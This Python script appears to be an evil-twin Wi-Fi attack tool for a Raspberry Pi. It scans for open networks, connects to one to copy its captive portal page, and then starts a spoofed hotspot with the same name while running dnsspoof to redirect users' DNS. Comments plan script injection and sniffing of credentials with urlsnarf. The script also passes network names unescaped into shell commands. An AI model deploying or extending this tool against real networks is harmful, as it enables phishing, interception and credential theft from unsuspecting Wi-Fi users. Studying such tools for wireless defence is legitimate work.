#!/usr/bin/python3

from subprocess import Popen, PIPE, STDOUT
import os
import time
import sys

#TODO all scripts relative to this document (basename)

debug=True

def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        return False

###USE SAVED DATA
#create directory and gitignore it
directory="copied_network_profiles"
p = Popen("mkdir "+directory+" && touch "+directory+"/.gitignore", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
for line in p.stdout.read().splitlines():
    if debug:
        print("[DEBUG]"+line.decode("utf-8"))

#show all the old ones available
p = Popen("ls -1 "+directory, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
old_networks=[]
for line in p.stdout.read().splitlines():
    if debug: 
        print("[DEBUG]"+line.decode("utf-8"))
    old_networks.append(line.decode("utf-8"))
if len(old_networks) > 0:
    print("ALREADY COPIED NETWORKS:")
    counter=1
    for network in old_networks: #print all old ones with nr's before them.
        print(str(counter)+") "+network.replace(".conf",""))
        counter=counter+1
    print("")
    print("Give a nr of a network you want to use or")
else:
    print("[INFO]NO COPIED NETWORKS")

print("Give '0' to copy a new non-profiled network or type anything else to quit:") #Give input option 0 for create new, and add all the other ones, q = quit
answer=input()
print("");

###COPYING
if answer == "0":
    #CREATE NEW
    print("Looking for new networks to copy...")
    #scan all, give nr's and gather data ready to use
    target_essid=""
    while 1:
        print("Scanning for unencrypted networks...")
        p = Popen("sudo iwlist wlan0 scan | grep -A 5 'Cell'", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        scanned_networks_raw=[]
        for line in p.stdout.read().splitlines():
            if line.decode("utf-8") !="--": #filter the grep extras
                scanned_networks_raw.append(line.decode("utf-8"))
                if debug:
                    print("[DEBUG]"+line.decode("utf-8"))

        #parse all networks in an array with properties
        scanned_networks=[]
        counter=0
        for i in range(int((len(scanned_networks_raw)-int(len(scanned_networks_raw))%6)/6)):
            #if 'off' in scanned_networks_raw[6*i+0:6*i+6][4]:
            scanned_networks.append({})
            # only unprotected ones
            for data in scanned_networks_raw[6*i+0:6*i+6]: 
                if "Quality" in data:
                    scanned_networks[counter]["info"]=data.lstrip().rstrip()
                else: 
                    scanned_networks[counter][data.split(":",1)[0].lstrip().rstrip().replace('"','')]=data.split(":",1)[1].lstrip().rstrip().replace('"','')
            counter=counter+1
        
        # list all networks
        counter = 1
        for network in scanned_networks:
            #TODO meer info
            if network['Encryption key'] == "off":
                print(str(counter)+") "+network["ESSID"])
                counter=counter+1
            else:
                print(len(str(counter))*" "+"  "+network["ESSID"]+" (encrypted)")

        if counter != 1:
            print("Give the number of the network you want to copy, or leave empty to scan again:")
            answer=input()
            print("")

            if is_number(answer):
                if int(answer) < counter:
                    target_essid=scanned_networks[int(answer)-1]["ESSID"]
                    print("'"+target_essid+"' selected as AP to copy")
                    break
        else:
            print("There are no unencrypted networks to copy!")
            exit()

    #target_essid is to make a profile #CAPTIVE PORTAL -> identifier -> met ev een verwijzing
    #TODO check overwrite
    content='network={\n	ssid="'+target_essid+'"\n	key_mgmt=NONE\n}'
    p = Popen("echo '"+content+"' > "+directory+"/"+target_essid+".conf", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    for line in p.stdout.read().splitlines():
        if debug:
            print("[DEBUG]"+line.decode("utf-8"))


    #TODO ask to connect now
    print("If you want to mimic the served site (captive portal) from this AP, we need to connect to it, Do you want to do this? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
    answer=input()
    print("")
    if answer!="n":
        #connect and route 
        print("Resetting interface...")
        p = Popen("sh /home/pi/HackOTG/hotspot_stop.sh", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        for line in p.stdout.read().splitlines():
            if debug:
                print("[DEBUG]"+line.decode("utf-8"))

        print("Connecting to AP...")
        p = Popen("sudo wpa_supplicant -B -i wlan0 -D wext -dd -c /home/pi/HackOTG/"+directory+"/"+target_essid+".conf", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        for line in p.stdout.read().splitlines():
            if debug:
                print("[DEBUG]"+line.decode("utf-8"))

        #loop till assosiated properly
        counter=0
        while 1:

            #check if connected with iwconfig
            p = Popen("iwconfig wlan0 | grep "+target_essid+" | wc -l", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
            output=""
            for line in p.stdout.read().splitlines():
                output=line.decode("utf-8")
                if debug:
                    print("[DEBUG]"+line.decode("utf-8"))
            if output.lstrip() == "1":
                print("connected!")
                break
            else:
                counter=counter+1
                if counter == 10:
                    print("Timed out... Unable to associate with AP")
                    exit()
                time.sleep(1)

        print("Getting IP with DHCPCD...")
        p = Popen("sudo dhcpcd --nohook wpa_supplicant wlan0", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        for line in p.stdout.read().splitlines():
            if debug:
                print("[DEBUG]"+line.decode("utf-8"))
        # ifconfig has  inet -> but not fe80 (if we have a ip we can use? -> maybe another way? -> to know if we have a good ip
        counter=0
        while 1:

            #check if connected with iwconfig
            p = Popen("ifconfig wlan0 | grep inet | grep -v fe80 | wc -l", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
            output=""
            for line in p.stdout.read().splitlines():
                output=line.decode("utf-8")
                if debug:
                    print("[DEBUG]"+line.decode("utf-8"))
            if output.lstrip() == "1":
                print("IP adress assigned to interface!")
                break
            else:
                counter=counter+1
                if counter == 10:
                    print("Timed out... Unable to get IP from AP (DHCP)")
                    exit()
                time.sleep(1)

        #route traffic through wlan0 for the captive protal download
        print("Route all traffic through interface...")
        p = Popen("sh /home/pi/HackOTG/route_wlan0.sh", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
        for line in p.stdout.read().splitlines():
            if debug:
                print("[DEBUG]"+line.decode("utf-8"))
        #copy
        print("press <ENTER> to go through with downloading the served website(captive portal), this could take multiple tries)") #Give input option 0 for create new, and add all the other ones, q = quit
        answer=input()
        print("")
        while 1:
            print("Copy www.google.com (or the captive portal and save it to copied_sites/")
            p = Popen("python3 download_site.py www.google.com "+target_essid+".AP", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
            output=""
            for line in p.stdout.read().splitlines():
                output=line.decode("utf-8")
                if debug:
                    print("[DEBUG]"+line.decode("utf-8"))
            # check if this worked
            if "OK and no further redirects" in output: 
                print("Download succeeded")
                spoof_essid=target_essid
                break
            else:
                print("Failed, Unable to get a web page from AP (captive portal?)")
                print("Retry? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
                answer=input()
                print("")
                if answer == "n":
                    exit()
                time.sleep(1)
elif is_number(answer):
    if int(answer)-1 < len(old_networks):
        spoof_essid=old_networks[int(answer)-1].replace(".conf","")
    else:
        #EXIT
        print("Quiting...")
        exit()
else:
    #EXIT
    print("Quiting...")
    exit()


###SPOOFING
#spoof_essid contains the essid -> .conf file in directory can have the full profile (TODO), captive portal is coppied with <essid>.copied
print("Preparing to spoof '"+spoof_essid+"' ...")
spoof_options={}
# print the selected profile, if there is a captive portal for it etc
p = Popen("ls -1 copied_sites/"+spoof_essid+".AP/ | wc -l", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
output=""
for line in p.stdout.read().splitlines():
    output=line.decode("utf-8")
    if debug: 
        print("[DEBUG]"+line.decode("utf-8"))

spoof_options["use_captive_portal"]=False
if int(output) > 0:
    print("Copied site for this AP present!")
    print("Do you want to use it as a captive portal for the spoofed network? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
    answer=input()
    print("")
    if answer != "n":
        spoof_options["use_captive_portal"]=True
else:
    print("no copied site present")

#TODO ask here for extra attacks
#TODO ask if inject scripts (which ones,)
#TODO ask if check for creds flying over the air urlsnarf? -> log to a file
#TODO make a folder with the captive portal and the injected file inserted into it.

# ask to spoof now
print("Do you want to start spoofing with the following options?") #Give input option 0 for create new, and add all the other ones, q = quit
#TODO loop rhough all options
for key in spoof_options:
    print(key+": "+str(spoof_options[key]))
print("(Y/n): ")
answer=input()
print("")

#folliwing all in one commnad? popeeN?
#TODO start op server 
#TODO start up dnsspoof

#start up hostapd with all the settings (maybe bssid) -> use external script 
#TODO more spoofing options?
p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53&", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
for line in iter(p.stdout.readline, ""):
        print('\r'+line[:-1].decode("utf-8"))

#TODO get the info lines as it is coming in

#TODO trap if quit that cleans up all processes

